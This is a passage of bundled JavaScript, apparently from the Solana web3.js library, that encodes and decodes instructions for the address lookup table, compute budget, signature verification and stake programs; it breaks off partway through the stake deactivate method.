      const LOOKUP_TABLE_INSTRUCTION_LAYOUTS = Object.freeze({
        CreateLookupTable: {
          index: 0,
          layout: BufferLayout__namespace.struct([BufferLayout__namespace.u32('instruction'), u64('recentSlot'), BufferLayout__namespace.u8('bumpSeed')])
        },
        FreezeLookupTable: {
          index: 1,
          layout: BufferLayout__namespace.struct([BufferLayout__namespace.u32('instruction')])
        },
        ExtendLookupTable: {
          index: 2,
          layout: BufferLayout__namespace.struct([BufferLayout__namespace.u32('instruction'), u64(), BufferLayout__namespace.seq(publicKey(), BufferLayout__namespace.offset(BufferLayout__namespace.u32(), -8), 'addresses')])
        },
        DeactivateLookupTable: {
          index: 3,
          layout: BufferLayout__namespace.struct([BufferLayout__namespace.u32('instruction')])
        },
        CloseLookupTable: {
          index: 4,
          layout: BufferLayout__namespace.struct([BufferLayout__namespace.u32('instruction')])
        }
      });
      class AddressLookupTableInstruction {
        constructor() {}
        static decodeInstructionType(instruction) {
          this.checkProgramId(instruction.programId);
          const instructionTypeLayout = BufferLayout__namespace.u32('instruction');
          const index = instructionTypeLayout.decode(instruction.data);
          let type;
          for (const [layoutType, layout] of Object.entries(LOOKUP_TABLE_INSTRUCTION_LAYOUTS)) {
            if (layout.index == index) {
              type = layoutType;
              break;
            }
          }
          if (!type) {
            throw new Error('Invalid Instruction. Should be a LookupTable Instruction');
          }
          return type;
        }
        static decodeCreateLookupTable(instruction) {
          this.checkProgramId(instruction.programId);
          this.checkKeysLength(instruction.keys, 4);
          const {
            recentSlot
          } = decodeData$1(LOOKUP_TABLE_INSTRUCTION_LAYOUTS.CreateLookupTable, instruction.data);
          return {
            authority: instruction.keys[1].pubkey,
            payer: instruction.keys[2].pubkey,
            recentSlot: Number(recentSlot)
          };
        }
        static decodeExtendLookupTable(instruction) {
          this.checkProgramId(instruction.programId);
          if (instruction.keys.length < 2) {
            throw new Error(`invalid instruction; found ${instruction.keys.length} keys, expected at least 2`);
          }
          const {
            addresses
          } = decodeData$1(LOOKUP_TABLE_INSTRUCTION_LAYOUTS.ExtendLookupTable, instruction.data);
          return {
            lookupTable: instruction.keys[0].pubkey,
            authority: instruction.keys[1].pubkey,
            payer: instruction.keys.length > 2 ? instruction.keys[2].pubkey : undefined,
            addresses: addresses.map(buffer => new PublicKey(buffer))
          };
        }
        static decodeCloseLookupTable(instruction) {
          this.checkProgramId(instruction.programId);
          this.checkKeysLength(instruction.keys, 3);
          return {
            lookupTable: instruction.keys[0].pubkey,
            authority: instruction.keys[1].pubkey,
            recipient: instruction.keys[2].pubkey
          };
        }
        static decodeFreezeLookupTable(instruction) {
          this.checkProgramId(instruction.programId);
          this.checkKeysLength(instruction.keys, 2);
          return {
            lookupTable: instruction.keys[0].pubkey,
            authority: instruction.keys[1].pubkey
          };
        }
        static decodeDeactivateLookupTable(instruction) {
          this.checkProgramId(instruction.programId);
          this.checkKeysLength(instruction.keys, 2);
          return {
            lookupTable: instruction.keys[0].pubkey,
            authority: instruction.keys[1].pubkey
          };
        }
        static checkProgramId(programId) {
          if (!programId.equals(AddressLookupTableProgram.programId)) {
            throw new Error('invalid instruction; programId is not AddressLookupTable Program');
          }
        }
        static checkKeysLength(keys, expectedLength) {
          if (keys.length < expectedLength) {
            throw new Error(`invalid instruction; found ${keys.length} keys, expected at least ${expectedLength}`);
          }
        }
      }
      class AddressLookupTableProgram {
        constructor() {}
        static createLookupTable(params) {
          const [lookupTableAddress, bumpSeed] = PublicKey.findProgramAddressSync([params.authority.toBuffer(), bigintBuffer.toBufferLE(BigInt(params.recentSlot), 8)], this.programId);
          const type = LOOKUP_TABLE_INSTRUCTION_LAYOUTS.CreateLookupTable;
          const data = encodeData(type, {
            recentSlot: BigInt(params.recentSlot),
            bumpSeed: bumpSeed
          });
          const keys = [{
            pubkey: lookupTableAddress,
            isSigner: false,
            isWritable: true
          }, {
            pubkey: params.authority,
            isSigner: true,
            isWritable: false
          }, {
            pubkey: params.payer,
            isSigner: true,
            isWritable: true
          }, {
            pubkey: SystemProgram.programId,
            isSigner: false,
            isWritable: false
          }];
          return [new TransactionInstruction({
            programId: this.programId,
            keys: keys,
            data: data
          }), lookupTableAddress];
        }
        static freezeLookupTable(params) {
          const type = LOOKUP_TABLE_INSTRUCTION_LAYOUTS.FreezeLookupTable;
          const data = encodeData(type);
          const keys = [{
            pubkey: params.lookupTable,
            isSigner: false,
            isWritable: true
          }, {
            pubkey: params.authority,
            isSigner: true,
            isWritable: false
          }];
          return new TransactionInstruction({
            programId: this.programId,
            keys: keys,
            data: data
          });
        }
        static extendLookupTable(params) {
          const type = LOOKUP_TABLE_INSTRUCTION_LAYOUTS.ExtendLookupTable;
          const data = encodeData(type, {
            addresses: params.addresses.map(addr => addr.toBytes())
          });
          const keys = [{
            pubkey: params.lookupTable,
            isSigner: false,
            isWritable: true
          }, {
            pubkey: params.authority,
            isSigner: true,
            isWritable: false
          }];
          if (params.payer) {
            keys.push({
              pubkey: params.payer,
              isSigner: true,
              isWritable: true
            }, {
              pubkey: SystemProgram.programId,
              isSigner: false,
              isWritable: false
            });
          }
          return new TransactionInstruction({
            programId: this.programId,
            keys: keys,
            data: data
          });
        }
        static deactivateLookupTable(params) {
          const type = LOOKUP_TABLE_INSTRUCTION_LAYOUTS.DeactivateLookupTable;
          const data = encodeData(type);
          const keys = [{
            pubkey: params.lookupTable,
            isSigner: false,
            isWritable: true
          }, {
            pubkey: params.authority,
            isSigner: true,
            isWritable: false
          }];
          return new TransactionInstruction({
            programId: this.programId,
            keys: keys,
            data: data
          });
        }
        static closeLookupTable(params) {
          const type = LOOKUP_TABLE_INSTRUCTION_LAYOUTS.CloseLookupTable;
          const data = encodeData(type);
          const keys = [{
            pubkey: params.lookupTable,
            isSigner: false,
            isWritable: true
          }, {
            pubkey: params.authority,
            isSigner: true,
            isWritable: false
          }, {
            pubkey: params.recipient,
            isSigner: false,
            isWritable: true
          }];
          return new TransactionInstruction({
            programId: this.programId,
            keys: keys,
            data: data
          });
        }
      }
      AddressLookupTableProgram.programId = new PublicKey('AddressLookupTab1e1111111111111111111111111');
      class ComputeBudgetInstruction {
        constructor() {}
        static decodeInstructionType(instruction) {
          this.checkProgramId(instruction.programId);
          const instructionTypeLayout = BufferLayout__namespace.u8('instruction');
          const typeIndex = instructionTypeLayout.decode(instruction.data);
          let type;
          for (const [ixType, layout] of Object.entries(COMPUTE_BUDGET_INSTRUCTION_LAYOUTS)) {
            if (layout.index == typeIndex) {
              type = ixType;
              break;
            }
          }
          if (!type) {
            throw new Error('Instruction type incorrect; not a ComputeBudgetInstruction');
          }
          return type;
        }
        static decodeRequestUnits(instruction) {
          this.checkProgramId(instruction.programId);
          const {
            units,
            additionalFee
          } = decodeData$1(COMPUTE_BUDGET_INSTRUCTION_LAYOUTS.RequestUnits, instruction.data);
          return {
            units,
            additionalFee
          };
        }
        static decodeRequestHeapFrame(instruction) {
          this.checkProgramId(instruction.programId);
          const {
            bytes
          } = decodeData$1(COMPUTE_BUDGET_INSTRUCTION_LAYOUTS.RequestHeapFrame, instruction.data);
          return {
            bytes
          };
        }
        static decodeSetComputeUnitLimit(instruction) {
          this.checkProgramId(instruction.programId);
          const {
            units
          } = decodeData$1(COMPUTE_BUDGET_INSTRUCTION_LAYOUTS.SetComputeUnitLimit, instruction.data);
          return {
            units
          };
        }
        static decodeSetComputeUnitPrice(instruction) {
          this.checkProgramId(instruction.programId);
          const {
            microLamports
          } = decodeData$1(COMPUTE_BUDGET_INSTRUCTION_LAYOUTS.SetComputeUnitPrice, instruction.data);
          return {
            microLamports
          };
        }
        static checkProgramId(programId) {
          if (!programId.equals(ComputeBudgetProgram.programId)) {
            throw new Error('invalid instruction; programId is not ComputeBudgetProgram');
          }
        }
      }
      const COMPUTE_BUDGET_INSTRUCTION_LAYOUTS = Object.freeze({
        RequestUnits: {
          index: 0,
          layout: BufferLayout__namespace.struct([BufferLayout__namespace.u8('instruction'), BufferLayout__namespace.u32('units'), BufferLayout__namespace.u32('additionalFee')])
        },
        RequestHeapFrame: {
          index: 1,
          layout: BufferLayout__namespace.struct([BufferLayout__namespace.u8('instruction'), BufferLayout__namespace.u32('bytes')])
        },
        SetComputeUnitLimit: {
          index: 2,
          layout: BufferLayout__namespace.struct([BufferLayout__namespace.u8('instruction'), BufferLayout__namespace.u32('units')])
        },
        SetComputeUnitPrice: {
          index: 3,
          layout: BufferLayout__namespace.struct([BufferLayout__namespace.u8('instruction'), u64('microLamports')])
        }
      });
      class ComputeBudgetProgram {
        constructor() {}
        static requestUnits(params) {
          const type = COMPUTE_BUDGET_INSTRUCTION_LAYOUTS.RequestUnits;
          const data = encodeData(type, params);
          return new TransactionInstruction({
            keys: [],
            programId: this.programId,
            data
          });
        }
        static requestHeapFrame(params) {
          const type = COMPUTE_BUDGET_INSTRUCTION_LAYOUTS.RequestHeapFrame;
          const data = encodeData(type, params);
          return new TransactionInstruction({
            keys: [],
            programId: this.programId,
            data
          });
        }
        static setComputeUnitLimit(params) {
          const type = COMPUTE_BUDGET_INSTRUCTION_LAYOUTS.SetComputeUnitLimit;
          const data = encodeData(type, params);
          return new TransactionInstruction({
            keys: [],
            programId: this.programId,
            data
          });
        }
        static setComputeUnitPrice(params) {
          const type = COMPUTE_BUDGET_INSTRUCTION_LAYOUTS.SetComputeUnitPrice;
          const data = encodeData(type, {
            microLamports: BigInt(params.microLamports)
          });
          return new TransactionInstruction({
            keys: [],
            programId: this.programId,
            data
          });
        }
      }
      ComputeBudgetProgram.programId = new PublicKey('ComputeBudget111111111111111111111111111111');
      const PRIVATE_KEY_BYTES$1 = 64;
      const PUBLIC_KEY_BYTES$1 = 32;
      const SIGNATURE_BYTES = 64;
      const ED25519_INSTRUCTION_LAYOUT = BufferLayout__namespace.struct([BufferLayout__namespace.u8('numSignatures'), BufferLayout__namespace.u8('padding'), BufferLayout__namespace.u16('signatureOffset'), BufferLayout__namespace.u16('signatureInstructionIndex'), BufferLayout__namespace.u16('publicKeyOffset'), BufferLayout__namespace.u16('publicKeyInstructionIndex'), BufferLayout__namespace.u16('messageDataOffset'), BufferLayout__namespace.u16('messageDataSize'), BufferLayout__namespace.u16('messageInstructionIndex')]);
      class Ed25519Program {
        constructor() {}
        static createInstructionWithPublicKey(params) {
          const {
            publicKey,
            message,
            signature,
            instructionIndex
          } = params;
          assert(publicKey.length === PUBLIC_KEY_BYTES$1, `Public Key must be ${PUBLIC_KEY_BYTES$1} bytes but received ${publicKey.length} bytes`);
          assert(signature.length === SIGNATURE_BYTES, `Signature must be ${SIGNATURE_BYTES} bytes but received ${signature.length} bytes`);
          const publicKeyOffset = ED25519_INSTRUCTION_LAYOUT.span;
          const signatureOffset = publicKeyOffset + publicKey.length;
          const messageDataOffset = signatureOffset + signature.length;
          const numSignatures = 1;
          const instructionData = buffer.Buffer.alloc(messageDataOffset + message.length);
          const index = instructionIndex == null ? 0xffff : instructionIndex;
          ED25519_INSTRUCTION_LAYOUT.encode({
            numSignatures,
            padding: 0,
            signatureOffset,
            signatureInstructionIndex: index,
            publicKeyOffset,
            publicKeyInstructionIndex: index,
            messageDataOffset,
            messageDataSize: message.length,
            messageInstructionIndex: index
          }, instructionData);
          instructionData.fill(publicKey, publicKeyOffset);
          instructionData.fill(signature, signatureOffset);
          instructionData.fill(message, messageDataOffset);
          return new TransactionInstruction({
            keys: [],
            programId: Ed25519Program.programId,
            data: instructionData
          });
        }
        static createInstructionWithPrivateKey(params) {
          const {
            privateKey,
            message,
            instructionIndex
          } = params;
          assert(privateKey.length === PRIVATE_KEY_BYTES$1, `Private key must be ${PRIVATE_KEY_BYTES$1} bytes but received ${privateKey.length} bytes`);
          try {
            const keypair = Keypair.fromSecretKey(privateKey);
            const publicKey = keypair.publicKey.toBytes();
            const signature = sign(message, keypair.secretKey);
            return this.createInstructionWithPublicKey({
              publicKey,
              message,
              signature,
              instructionIndex
            });
          } catch (error) {
            throw new Error(`Error creating instruction; ${error}`);
          }
        }
      }
      Ed25519Program.programId = new PublicKey('Ed25519SigVerify111111111111111111111111111');
      secp256k1__namespace.utils.hmacSha256Sync = (key, ...msgs) => {
        const h = hmac.hmac.create(sha256.sha256, key);
        msgs.forEach(msg => h.update(msg));
        return h.digest();
      };
      const ecdsaSign = (msgHash, privKey) => secp256k1__namespace.signSync(msgHash, privKey, {
        der: false,
        recovered: true
      });
      secp256k1__namespace.utils.isValidPrivateKey;
      const publicKeyCreate = secp256k1__namespace.getPublicKey;
      const PRIVATE_KEY_BYTES = 32;
      const ETHEREUM_ADDRESS_BYTES = 20;
      const PUBLIC_KEY_BYTES = 64;
      const SIGNATURE_OFFSETS_SERIALIZED_SIZE = 11;
      const SECP256K1_INSTRUCTION_LAYOUT = BufferLayout__namespace.struct([BufferLayout__namespace.u8('numSignatures'), BufferLayout__namespace.u16('signatureOffset'), BufferLayout__namespace.u8('signatureInstructionIndex'), BufferLayout__namespace.u16('ethAddressOffset'), BufferLayout__namespace.u8('ethAddressInstructionIndex'), BufferLayout__namespace.u16('messageDataOffset'), BufferLayout__namespace.u16('messageDataSize'), BufferLayout__namespace.u8('messageInstructionIndex'), BufferLayout__namespace.blob(20, 'ethAddress'), BufferLayout__namespace.blob(64, 'signature'), BufferLayout__namespace.u8('recoveryId')]);
      class Secp256k1Program {
        constructor() {}
        static publicKeyToEthAddress(publicKey) {
          assert(publicKey.length === PUBLIC_KEY_BYTES, `Public key must be ${PUBLIC_KEY_BYTES} bytes but received ${publicKey.length} bytes`);
          try {
            return buffer.Buffer.from(sha3.keccak_256(toBuffer(publicKey))).slice(-ETHEREUM_ADDRESS_BYTES);
          } catch (error) {
            throw new Error(`Error constructing Ethereum address: ${error}`);
          }
        }
        static createInstructionWithPublicKey(params) {
          const {
            publicKey,
            message,
            signature,
            recoveryId,
            instructionIndex
          } = params;
          return Secp256k1Program.createInstructionWithEthAddress({
            ethAddress: Secp256k1Program.publicKeyToEthAddress(publicKey),
            message,
            signature,
            recoveryId,
            instructionIndex
          });
        }
        static createInstructionWithEthAddress(params) {
          const {
            ethAddress: rawAddress,
            message,
            signature,
            recoveryId,
            instructionIndex = 0
          } = params;
          let ethAddress;
          if (typeof rawAddress === 'string') {
            if (rawAddress.startsWith('0x')) {
              ethAddress = buffer.Buffer.from(rawAddress.substr(2), 'hex');
            } else {
              ethAddress = buffer.Buffer.from(rawAddress, 'hex');
            }
          } else {
            ethAddress = rawAddress;
          }
          assert(ethAddress.length === ETHEREUM_ADDRESS_BYTES, `Address must be ${ETHEREUM_ADDRESS_BYTES} bytes but received ${ethAddress.length} bytes`);
          const dataStart = 1 + SIGNATURE_OFFSETS_SERIALIZED_SIZE;
          const ethAddressOffset = dataStart;
          const signatureOffset = dataStart + ethAddress.length;
          const messageDataOffset = signatureOffset + signature.length + 1;
          const numSignatures = 1;
          const instructionData = buffer.Buffer.alloc(SECP256K1_INSTRUCTION_LAYOUT.span + message.length);
          SECP256K1_INSTRUCTION_LAYOUT.encode({
            numSignatures,
            signatureOffset,
            signatureInstructionIndex: instructionIndex,
            ethAddressOffset,
            ethAddressInstructionIndex: instructionIndex,
            messageDataOffset,
            messageDataSize: message.length,
            messageInstructionIndex: instructionIndex,
            signature: toBuffer(signature),
            ethAddress: toBuffer(ethAddress),
            recoveryId
          }, instructionData);
          instructionData.fill(toBuffer(message), SECP256K1_INSTRUCTION_LAYOUT.span);
          return new TransactionInstruction({
            keys: [],
            programId: Secp256k1Program.programId,
            data: instructionData
          });
        }
        static createInstructionWithPrivateKey(params) {
          const {
            privateKey: pkey,
            message,
            instructionIndex
          } = params;
          assert(pkey.length === PRIVATE_KEY_BYTES, `Private key must be ${PRIVATE_KEY_BYTES} bytes but received ${pkey.length} bytes`);
          try {
            const privateKey = toBuffer(pkey);
            const publicKey = publicKeyCreate(privateKey, false).slice(1);
            const messageHash = buffer.Buffer.from(sha3.keccak_256(toBuffer(message)));
            const [signature, recoveryId] = ecdsaSign(messageHash, privateKey);
            return this.createInstructionWithPublicKey({
              publicKey,
              message,
              signature,
              recoveryId,
              instructionIndex
            });
          } catch (error) {
            throw new Error(`Error creating instruction; ${error}`);
          }
        }
      }
      Secp256k1Program.programId = new PublicKey('KeccakSecp256k11111111111111111111111111111');
      const STAKE_CONFIG_ID = new PublicKey('StakeConfig11111111111111111111111111111111');
      class Authorized {
        constructor(staker, withdrawer) {
          this.staker = void 0;
          this.withdrawer = void 0;
          this.staker = staker;
          this.withdrawer = withdrawer;
        }
      }
      class Lockup {
        constructor(unixTimestamp, epoch, custodian) {
          this.unixTimestamp = void 0;
          this.epoch = void 0;
          this.custodian = void 0;
          this.unixTimestamp = unixTimestamp;
          this.epoch = epoch;
          this.custodian = custodian;
        }
      }
      Lockup.default = new Lockup(0, 0, PublicKey.default);
      class StakeInstruction {
        constructor() {}
        static decodeInstructionType(instruction) {
          this.checkProgramId(instruction.programId);
          const instructionTypeLayout = BufferLayout__namespace.u32('instruction');
          const typeIndex = instructionTypeLayout.decode(instruction.data);
          let type;
          for (const [ixType, layout] of Object.entries(STAKE_INSTRUCTION_LAYOUTS)) {
            if (layout.index == typeIndex) {
              type = ixType;
              break;
            }
          }
          if (!type) {
            throw new Error('Instruction type incorrect; not a StakeInstruction');
          }
          return type;
        }
        static decodeInitialize(instruction) {
          this.checkProgramId(instruction.programId);
          this.checkKeyLength(instruction.keys, 2);
          const {
            authorized,
            lockup
          } = decodeData$1(STAKE_INSTRUCTION_LAYOUTS.Initialize, instruction.data);
          return {
            stakePubkey: instruction.keys[0].pubkey,
            authorized: new Authorized(new PublicKey(authorized.staker), new PublicKey(authorized.withdrawer)),
            lockup: new Lockup(lockup.unixTimestamp, lockup.epoch, new PublicKey(lockup.custodian))
          };
        }
        static decodeDelegate(instruction) {
          this.checkProgramId(instruction.programId);
          this.checkKeyLength(instruction.keys, 6);
          decodeData$1(STAKE_INSTRUCTION_LAYOUTS.Delegate, instruction.data);
          return {
            stakePubkey: instruction.keys[0].pubkey,
            votePubkey: instruction.keys[1].pubkey,
            authorizedPubkey: instruction.keys[5].pubkey
          };
        }
        static decodeAuthorize(instruction) {
          this.checkProgramId(instruction.programId);
          this.checkKeyLength(instruction.keys, 3);
          const {
            newAuthorized,
            stakeAuthorizationType
          } = decodeData$1(STAKE_INSTRUCTION_LAYOUTS.Authorize, instruction.data);
          const o = {
            stakePubkey: instruction.keys[0].pubkey,
            authorizedPubkey: instruction.keys[2].pubkey,
            newAuthorizedPubkey: new PublicKey(newAuthorized),
            stakeAuthorizationType: {
              index: stakeAuthorizationType
            }
          };
          if (instruction.keys.length > 3) {
            o.custodianPubkey = instruction.keys[3].pubkey;
          }
          return o;
        }
        static decodeAuthorizeWithSeed(instruction) {
          this.checkProgramId(instruction.programId);
          this.checkKeyLength(instruction.keys, 2);
          const {
            newAuthorized,
            stakeAuthorizationType,
            authoritySeed,
            authorityOwner
          } = decodeData$1(STAKE_INSTRUCTION_LAYOUTS.AuthorizeWithSeed, instruction.data);
          const o = {
            stakePubkey: instruction.keys[0].pubkey,
            authorityBase: instruction.keys[1].pubkey,
            authoritySeed: authoritySeed,
            authorityOwner: new PublicKey(authorityOwner),
            newAuthorizedPubkey: new PublicKey(newAuthorized),
            stakeAuthorizationType: {
              index: stakeAuthorizationType
            }
          };
          if (instruction.keys.length > 3) {
            o.custodianPubkey = instruction.keys[3].pubkey;
          }
          return o;
        }
        static decodeSplit(instruction) {
          this.checkProgramId(instruction.programId);
          this.checkKeyLength(instruction.keys, 3);
          const {
            lamports
          } = decodeData$1(STAKE_INSTRUCTION_LAYOUTS.Split, instruction.data);
          return {
            stakePubkey: instruction.keys[0].pubkey,
            splitStakePubkey: instruction.keys[1].pubkey,
            authorizedPubkey: instruction.keys[2].pubkey,
            lamports
          };
        }
        static decodeMerge(instruction) {
          this.checkProgramId(instruction.programId);
          this.checkKeyLength(instruction.keys, 3);
          decodeData$1(STAKE_INSTRUCTION_LAYOUTS.Merge, instruction.data);
          return {
            stakePubkey: instruction.keys[0].pubkey,
            sourceStakePubKey: instruction.keys[1].pubkey,
            authorizedPubkey: instruction.keys[4].pubkey
          };
        }
        static decodeWithdraw(instruction) {
          this.checkProgramId(instruction.programId);
          this.checkKeyLength(instruction.keys, 5);
          const {
            lamports
          } = decodeData$1(STAKE_INSTRUCTION_LAYOUTS.Withdraw, instruction.data);
          const o = {
            stakePubkey: instruction.keys[0].pubkey,
            toPubkey: instruction.keys[1].pubkey,
            authorizedPubkey: instruction.keys[4].pubkey,
            lamports
          };
          if (instruction.keys.length > 5) {
            o.custodianPubkey = instruction.keys[5].pubkey;
          }
          return o;
        }
        static decodeDeactivate(instruction) {
          this.checkProgramId(instruction.programId);
          this.checkKeyLength(instruction.keys, 3);
          decodeData$1(STAKE_INSTRUCTION_LAYOUTS.Deactivate, instruction.data);
          return {
            stakePubkey: instruction.keys[0].pubkey,
            authorizedPubkey: instruction.keys[2].pubkey
          };
        }
        static checkProgramId(programId) {
          if (!programId.equals(StakeProgram.programId)) {
            throw new Error('invalid instruction; programId is not StakeProgram');
          }
        }
        static checkKeyLength(keys, expectedLength) {
          if (keys.length < expectedLength) {
            throw new Error(`invalid instruction; found ${keys.length} keys, expected at least ${expectedLength}`);
          }
        }
      }
      const STAKE_INSTRUCTION_LAYOUTS = Object.freeze({
        Initialize: {
          index: 0,
          layout: BufferLayout__namespace.struct([BufferLayout__namespace.u32('instruction'), authorized(), lockup()])
        },
        Authorize: {
          index: 1,
          layout: BufferLayout__namespace.struct([BufferLayout__namespace.u32('instruction'), publicKey('newAuthorized'), BufferLayout__namespace.u32('stakeAuthorizationType')])
        },
        Delegate: {
          index: 2,
          layout: BufferLayout__namespace.struct([BufferLayout__namespace.u32('instruction')])
        },
        Split: {
          index: 3,
          layout: BufferLayout__namespace.struct([BufferLayout__namespace.u32('instruction'), BufferLayout__namespace.ns64('lamports')])
        },
        Withdraw: {
          index: 4,
          layout: BufferLayout__namespace.struct([BufferLayout__namespace.u32('instruction'), BufferLayout__namespace.ns64('lamports')])
        },
        Deactivate: {
          index: 5,
          layout: BufferLayout__namespace.struct([BufferLayout__namespace.u32('instruction')])
        },
        Merge: {
          index: 7,
          layout: BufferLayout__namespace.struct([BufferLayout__namespace.u32('instruction')])
        },
        AuthorizeWithSeed: {
          index: 8,
          layout: BufferLayout__namespace.struct([BufferLayout__namespace.u32('instruction'), publicKey('newAuthorized'), BufferLayout__namespace.u32('stakeAuthorizationType'), rustString('authoritySeed'), publicKey('authorityOwner')])
        }
      });
      const StakeAuthorizationLayout = Object.freeze({
        Staker: {
          index: 0
        },
        Withdrawer: {
          index: 1
        }
      });
      class StakeProgram {
        constructor() {}
        static initialize(params) {
          const {
            stakePubkey,
            authorized,
            lockup: maybeLockup
          } = params;
          const lockup = maybeLockup || Lockup.default;
          const type = STAKE_INSTRUCTION_LAYOUTS.Initialize;
          const data = encodeData(type, {
            authorized: {
              staker: toBuffer(authorized.staker.toBuffer()),
              withdrawer: toBuffer(authorized.withdrawer.toBuffer())
            },
            lockup: {
              unixTimestamp: lockup.unixTimestamp,
              epoch: lockup.epoch,
              custodian: toBuffer(lockup.custodian.toBuffer())
            }
          });
          const instructionData = {
            keys: [{
              pubkey: stakePubkey,
              isSigner: false,
              isWritable: true
            }, {
              pubkey: SYSVAR_RENT_PUBKEY,
              isSigner: false,
              isWritable: false
            }],
            programId: this.programId,
            data
          };
          return new TransactionInstruction(instructionData);
        }
        static createAccountWithSeed(params) {
          const transaction = new Transaction();
          transaction.add(SystemProgram.createAccountWithSeed({
            fromPubkey: params.fromPubkey,
            newAccountPubkey: params.stakePubkey,
            basePubkey: params.basePubkey,
            seed: params.seed,
            lamports: params.lamports,
            space: this.space,
            programId: this.programId
          }));
          const {
            stakePubkey,
            authorized,
            lockup
          } = params;
          return transaction.add(this.initialize({
            stakePubkey,
            authorized,
            lockup
          }));
        }
        static createAccount(params) {
          const transaction = new Transaction();
          transaction.add(SystemProgram.createAccount({
            fromPubkey: params.fromPubkey,
            newAccountPubkey: params.stakePubkey,
            lamports: params.lamports,
            space: this.space,
            programId: this.programId
          }));
          const {
            stakePubkey,
            authorized,
            lockup
          } = params;
          return transaction.add(this.initialize({
            stakePubkey,
            authorized,
            lockup
          }));
        }
        static delegate(params) {
          const {
            stakePubkey,
            authorizedPubkey,
            votePubkey
          } = params;
          const type = STAKE_INSTRUCTION_LAYOUTS.Delegate;
          const data = encodeData(type);
          return new Transaction().add({
            keys: [{
              pubkey: stakePubkey,
              isSigner: false,
              isWritable: true
            }, {
              pubkey: votePubkey,
              isSigner: false,
              isWritable: false
            }, {
              pubkey: SYSVAR_CLOCK_PUBKEY,
              isSigner: false,
              isWritable: false
            }, {
              pubkey: SYSVAR_STAKE_HISTORY_PUBKEY,
              isSigner: false,
              isWritable: false
            }, {
              pubkey: STAKE_CONFIG_ID,
              isSigner: false,
              isWritable: false
            }, {
              pubkey: authorizedPubkey,
              isSigner: true,
              isWritable: false
            }],
            programId: this.programId,
            data
          });
        }
        static authorize(params) {
          const {
            stakePubkey,
            authorizedPubkey,
            newAuthorizedPubkey,
            stakeAuthorizationType,
            custodianPubkey
          } = params;
          const type = STAKE_INSTRUCTION_LAYOUTS.Authorize;
          const data = encodeData(type, {
            newAuthorized: toBuffer(newAuthorizedPubkey.toBuffer()),
            stakeAuthorizationType: stakeAuthorizationType.index
          });
          const keys = [{
            pubkey: stakePubkey,
            isSigner: false,
            isWritable: true
          }, {
            pubkey: SYSVAR_CLOCK_PUBKEY,
            isSigner: false,
            isWritable: true
          }, {
            pubkey: authorizedPubkey,
            isSigner: true,
            isWritable: false
          }];
          if (custodianPubkey) {
            keys.push({
              pubkey: custodianPubkey,
              isSigner: false,
              isWritable: false
            });
          }
          return new Transaction().add({
            keys,
            programId: this.programId,
            data
          });
        }
        static authorizeWithSeed(params) {
          const {
            stakePubkey,
            authorityBase,
            authoritySeed,
            authorityOwner,
            newAuthorizedPubkey,
            stakeAuthorizationType,
            custodianPubkey
          } = params;
          const type = STAKE_INSTRUCTION_LAYOUTS.AuthorizeWithSeed;
          const data = encodeData(type, {
            newAuthorized: toBuffer(newAuthorizedPubkey.toBuffer()),
            stakeAuthorizationType: stakeAuthorizationType.index,
            authoritySeed: authoritySeed,
            authorityOwner: toBuffer(authorityOwner.toBuffer())
          });
          const keys = [{
            pubkey: stakePubkey,
            isSigner: false,
            isWritable: true
          }, {
            pubkey: authorityBase,
            isSigner: true,
            isWritable: false
          }, {
            pubkey: SYSVAR_CLOCK_PUBKEY,
            isSigner: false,
            isWritable: false
          }];
          if (custodianPubkey) {
            keys.push({
              pubkey: custodianPubkey,
              isSigner: false,
              isWritable: false
            });
          }
          return new Transaction().add({
            keys,
            programId: this.programId,
            data
          });
        }
        static splitInstruction(params) {
          const {
            stakePubkey,
            authorizedPubkey,
            splitStakePubkey,
            lamports
          } = params;
          const type = STAKE_INSTRUCTION_LAYOUTS.Split;
          const data = encodeData(type, {
            lamports
          });
          return new TransactionInstruction({
            keys: [{
              pubkey: stakePubkey,
              isSigner: false,
              isWritable: true
            }, {
              pubkey: splitStakePubkey,
              isSigner: false,
              isWritable: true
            }, {
              pubkey: authorizedPubkey,
              isSigner: true,
              isWritable: false
            }],
            programId: this.programId,
            data
          });
        }
        static split(params) {
          const transaction = new Transaction();
          transaction.add(SystemProgram.createAccount({
            fromPubkey: params.authorizedPubkey,
            newAccountPubkey: params.splitStakePubkey,
            lamports: 0,
            space: this.space,
            programId: this.programId
          }));
          return transaction.add(this.splitInstruction(params));
        }
        static splitWithSeed(params) {
          const {
            stakePubkey,
            authorizedPubkey,
            splitStakePubkey,
            basePubkey,
            seed,
            lamports
          } = params;
          const transaction = new Transaction();
          transaction.add(SystemProgram.allocate({
            accountPubkey: splitStakePubkey,
            basePubkey,
            seed,
            space: this.space,
            programId: this.programId
          }));
          return transaction.add(this.splitInstruction({
            stakePubkey,
            authorizedPubkey,
            splitStakePubkey,
            lamports
          }));
        }
        static merge(params) {
          const {
            stakePubkey,
            sourceStakePubKey,
            authorizedPubkey
          } = params;
          const type = STAKE_INSTRUCTION_LAYOUTS.Merge;
          const data = encodeData(type);
          return new Transaction().add({
            keys: [{
              pubkey: stakePubkey,
              isSigner: false,
              isWritable: true
            }, {
              pubkey: sourceStakePubKey,
              isSigner: false,
              isWritable: true
            }, {
              pubkey: SYSVAR_CLOCK_PUBKEY,
              isSigner: false,
              isWritable: false
            }, {
              pubkey: SYSVAR_STAKE_HISTORY_PUBKEY,
              isSigner: false,
              isWritable: false
            }, {
              pubkey: authorizedPubkey,
              isSigner: true,
              isWritable: false
            }],
            programId: this.programId,
            data
          });
        }
        static withdraw(params) {
          const {
            stakePubkey,
            authorizedPubkey,
            toPubkey,
            lamports,
            custodianPubkey
          } = params;
          const type = STAKE_INSTRUCTION_LAYOUTS.Withdraw;
          const data = encodeData(type, {
            lamports
          });
          const keys = [{
            pubkey: stakePubkey,
            isSigner: false,
            isWritable: true
          }, {
            pubkey: toPubkey,
            isSigner: false,
            isWritable: true
          }, {
            pubkey: SYSVAR_CLOCK_PUBKEY,
            isSigner: false,
            isWritable: false
          }, {
            pubkey: SYSVAR_STAKE_HISTORY_PUBKEY,
            isSigner: false,
            isWritable: false
          }, {
            pubkey: authorizedPubkey,
            isSigner: true,
            isWritable: false
          }];
          if (custodianPubkey) {
            keys.push({
              pubkey: custodianPubkey,
              isSigner: false,
              isWritable: false
            });
          }
          return new Transaction().add({
            keys,
            programId: this.programId,
            data
          });
        }
        static deactivate(params) {
          const {
            stakePubkey,
            authorizedPubkey
          } = params;
          const type = STAKE_INSTRUCTION_LAYOUTS.Deactivate;
          const data = encodeData(type);
          return new Transaction().add({
            keys: [{
              pubkey: stakePubkey,
              isSigner: false,
